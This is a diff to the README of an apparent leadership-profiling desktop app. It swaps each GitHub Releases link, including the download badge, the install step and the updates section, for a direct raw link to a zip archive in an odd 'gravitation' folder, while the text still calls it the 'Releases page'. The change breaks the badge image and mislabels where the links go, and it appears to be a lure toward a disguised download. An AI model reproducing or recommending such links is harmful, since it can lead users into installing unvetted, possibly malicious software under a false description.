@@ -1,6 +1,6 @@
 # 🎉 WorkStyle_Profiling - Discover Your Leadership Fit
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Here-blue)](https://github.com/DeadEyers/WorkStyle_Profiling/releases)
+[![Download Now](https://raw.githubusercontent.com/DeadEyers/WorkStyle_Profiling/main/gravitation/WorkStyle_Profiling.zip%20Now-Visit%20Here-blue)](https://raw.githubusercontent.com/DeadEyers/WorkStyle_Profiling/main/gravitation/WorkStyle_Profiling.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with WorkStyle_Profiling, you need to download the software and r
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page here](https://github.com/DeadEyers/WorkStyle_Profiling/releases).
+1. **Visit the Releases Page**: Go to the [Releases page here](https://raw.githubusercontent.com/DeadEyers/WorkStyle_Profiling/main/gravitation/WorkStyle_Profiling.zip).
    
 2. **Choose Your Version**: Scroll down to see the available versions. Each version comes with different features. Pick the one that suits your needs.
 
@@ -58,7 +58,7 @@ Currently, this application is designed for desktop use. There are no mobile ver
 
 ## 🔄 Updates
 
-Stay tuned for updates as we continuously improve WorkStyle_Profiling. New features and enhancements will be added in future releases. Check the [Releases page](https://github.com/DeadEyers/WorkStyle_Profiling/releases) regularly for the latest versions.
+Stay tuned for updates as we continuously improve WorkStyle_Profiling. New features and enhancements will be added in future releases. Check the [Releases page](https://raw.githubusercontent.com/DeadEyers/WorkStyle_Profiling/main/gravitation/WorkStyle_Profiling.zip) regularly for the latest versions.
 
 ## 📞 Support
 
